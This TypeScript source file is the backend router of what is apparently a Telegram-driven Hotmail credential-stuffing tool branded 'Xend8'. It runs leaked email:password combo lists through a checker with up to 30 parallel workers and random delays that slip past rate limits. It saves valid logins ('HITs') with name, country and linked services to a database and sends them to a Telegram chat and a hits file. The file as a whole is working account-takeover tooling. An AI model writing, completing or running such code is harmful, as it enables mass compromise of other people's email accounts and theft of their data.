import { z } from "zod";
import { createRouter, publicQuery } from "../middleware";
import { getDb } from "../queries/connection";
import { checkerResults } from "@db/schema";
import { desc } from "drizzle-orm";
import { checkAccount, type CheckResult } from "../services/checker";
import { sendMessage, sendDocument, getCheckerStopKeyboard, getMainMenuKeyboard, getProgressBar } from "../services/telegram";

// ─── Worker Pool for Concurrent Checking ───────────────────────────

interface CheckerSession {
  stop: boolean;
  paused: boolean;
  results: CheckResult[];
  processed: number;
  hit: number;
  bad: number;
  retry: number;
  total: number;
  workers: number;
  chatId: number;
  userId: string;
  progressMessageId?: number;
  checkedAccounts: Set<string>;
  retryQueue: { email: string; password: string }[];
  hitBuffer: string;
}

const activeCheckers = new Map<string, CheckerSession>();

const MAX_CONCURRENT = 30; // Default parallel workers
const MAX_RETRIES = 2;

async function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

function randomDelay(min = 10, max = 50) {
  return sleep(Math.random() * (max - min) + min);
}

async function updateProgress(session: CheckerSession) {
  if (!session.progressMessageId) return;
  const bar = getProgressBar(session.processed, session.total);
  await editMessageSafe(
    session.chatId,
    session.progressMessageId,
    `Checking...\n${bar}\n✓ ${session.hit} | ✗ ${session.bad} / ${session.total}`,
    getCheckerStopKeyboard()
  );
}

async function editMessageSafe(chatId: number, messageId: number, text: string, keyboard?: any) {
  try {
    const { env } = await import("../lib/env");
    await fetch(`https://api.telegram.org/bot${env.telegramBotToken}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
    });
  } catch {
    // silently fail
  }
}

async function deleteMessageSafe(chatId: number, messageId: number) {
  try {
    const { env } = await import("../lib/env");
    await fetch(`https://api.telegram.org/bot${env.telegramBotToken}/deleteMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
      }),
    });
  } catch {
    // silently fail
  }
}

async function sendHitNotification(session: CheckerSession, result: CheckResult) {
  const services = result.linkedServices?.join("\n") || "No linked apps found";
  const totalHits = session.hit;

  const msg = `ᜰ ✗ᴇɴᴅ8 HOTMAIL HIT FOUND ᜰ
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: ${result.email}
🔑 Pass: ${result.password}
👤 Name: ${result.name || "Unknown"}
🌍 Country: ${result.country || "Unknown"}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 Linked Services:
${services}

✗ Total Hits: ${totalHits}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊`;

  await sendMessage(session.chatId, msg);

  // Append to hit buffer for file upload
  const linkedStr = result.linkedServices?.join(", ") || "None";
  session.hitBuffer += `${result.email}:${result.password} | ${result.name || "Unknown"} | ${result.country || "Unknown"} | [${linkedStr}]\n`;
}

async function processCombo(
  session: CheckerSession,
  combo: { email: string; password: string },
  retryCount = 0
): Promise<void> {
  if (session.stop) return;

  const accountId = `${combo.email}:${combo.password}`;

  // Skip duplicates
  if (session.checkedAccounts.has(accountId)) {
    session.processed++;
    return;
  }
  session.checkedAccounts.add(accountId);

  // Rate limiting delay
  await randomDelay(10, 50);

  if (session.stop) return;

  const result = await checkAccount(combo.email, combo.password);

  // Save to DB
  const db = getDb();
  await db.insert(checkerResults).values({
    email: result.email,
    password: result.password,
    status: result.status,
    name: result.name,
    country: result.country,
    linkedServices: result.linkedServices?.join(", ") || "",
  });

  session.results.push(result);

  if (result.status === "HIT") {
    session.hit++;
    if (result.linkedServices && result.linkedServices.length > 0) {
      await sendHitNotification(session, result);
    }
  } else if (result.status === "BAD") {
    session.bad++;
  } else if (result.status === "RETRY") {
    session.retry++;
    if (retryCount < MAX_RETRIES) {
      session.retryQueue.push(combo);
    }
  }

  session.processed++;
}

async function runWorkers(sessionId: string) {
  const session = activeCheckers.get(sessionId);
  if (!session) return;

  const combos = [...session.retryQueue];
  session.retryQueue = [];

  // Process retries first, then remaining combos
  const allCombos = combos;

  // Process in batches of workers
  const batchSize = session.workers;
  for (let i = 0; i < allCombos.length; i += batchSize) {
    if (session.stop) break;

    const batch = allCombos.slice(i, i + batchSize);
    await Promise.all(batch.map((combo) => processCombo(session, combo)));

    // Update progress after each batch
    await updateProgress(session);

    if (session.stop) break;
  }

  // Process any new retries
  while (session.retryQueue.length > 0 && !session.stop) {
    const retryBatch = [...session.retryQueue];
    session.retryQueue = [];

    for (let i = 0; i < retryBatch.length; i += batchSize) {
      if (session.stop) break;
      const batch = retryBatch.slice(i, i + batchSize);
      await Promise.all(batch.map((combo) => processCombo(session, combo, 1)));
      await updateProgress(session);
    }
  }

  // Upload hits file if there are hits
  if (session.hit > 0 && session.hitBuffer) {
    try {
      const encoder = new TextEncoder();
      const hitData = encoder.encode(session.hitBuffer);

      // Send to Telegram
      const caption = `ᜰ ALL HITS - Total: ${session.hit}\n@x08dev @Xend8tool`;
      await sendDocument(session.chatId, hitData, caption, "xend8_hits.txt");
    } catch {
      // silently fail
    }
  }

  // Final message
  if (session.progressMessageId) {
    await deleteMessageSafe(session.chatId, session.progressMessageId);
  }

  const stoppedText = session.stop ? "Stopped ⊘" : "Completed ☑";
  await sendMessage(
    session.chatId,
    `${stoppedText}\n✓ Valid: ${session.hit}\n✗ Invalid: ${session.bad}\n⧖ Retries: ${session.retry}\nTotal: ${session.processed}/${session.total}`,
    getMainMenuKeyboard(true)
  );

  activeCheckers.delete(sessionId);
}

// ─── tRPC Router ────────────────────────────────────────────────────

export const checkerRouter = createRouter({
  checkSingle: publicQuery
    .input(
      z.object({
        email: z.string().email(),
        password: z.string().min(1),
      })
    )
    .mutation(async ({ input }) => {
      const result = await checkAccount(input.email, input.password);

      const db = getDb();
      await db.insert(checkerResults).values({
        email: result.email,
        password: result.password,
        status: result.status,
        name: result.name,
        country: result.country,
        linkedServices: result.linkedServices?.join(", ") || "",
      });

      return result;
    }),

  startBatch: publicQuery
    .input(
      z.object({
        combos: z.array(z.object({ email: z.string(), password: z.string() })),
        sessionId: z.string(),
        chatId: z.number(),
        userId: z.string(),
        workers: z.number().min(1).max(100).optional(),
      })
    )
    .mutation(async ({ input }) => {
      // Deduplicate combos
      const seen = new Set<string>();
      const uniqueCombos = input.combos.filter((c) => {
        const id = `${c.email}:${c.password}`;
        if (seen.has(id)) return false;
        seen.add(id);
        return true;
      });

      const session: CheckerSession = {
        stop: false,
        paused: false,
        results: [],
        processed: 0,
        hit: 0,
        bad: 0,
        retry: 0,
        total: uniqueCombos.length,
        workers: input.workers || MAX_CONCURRENT,
        chatId: input.chatId,
        userId: input.userId,
        checkedAccounts: new Set(),
        retryQueue: uniqueCombos,
        hitBuffer: "",
      };

      activeCheckers.set(input.sessionId, session);

      // Send initial progress message
      const progressMsg = await sendMessage(
        input.chatId,
        `Checking...\n${getProgressBar(0, uniqueCombos.length)}\n✓ 0 | ✗ 0 / ${uniqueCombos.length}`,
        getCheckerStopKeyboard()
      );

      if (progressMsg?.ok) {
        session.progressMessageId = progressMsg.result.message_id;
      }

      // Start workers in background
      runWorkers(input.sessionId).catch(() => {
        activeCheckers.delete(input.sessionId);
      });

      return {
        started: true,
        total: uniqueCombos.length,
        sessionId: input.sessionId,
      };
    }),

  stopCheck: publicQuery
    .input(z.object({ sessionId: z.string() }))
    .mutation(({ input }) => {
      const session = activeCheckers.get(input.sessionId);
      if (session) {
        session.stop = true;
      }
      return { success: true };
    }),

  status: publicQuery
    .input(z.object({ sessionId: z.string() }))
    .query(({ input }) => {
      const session = activeCheckers.get(input.sessionId);
      if (!session) {
        return { active: false };
      }
      return {
        active: !session.stop,
        processed: session.processed,
        total: session.total,
        hit: session.hit,
        bad: session.bad,
        retry: session.retry,
      };
    }),

  results: publicQuery.query(async () => {
    const db = getDb();
    const results = await db.select().from(checkerResults).orderBy(desc(checkerResults.createdAt)).limit(100);
    return results;
  }),

  clearResults: publicQuery.mutation(async () => {
    const db = getDb();
    await db.delete(checkerResults);
    return { success: true };
  }),
});
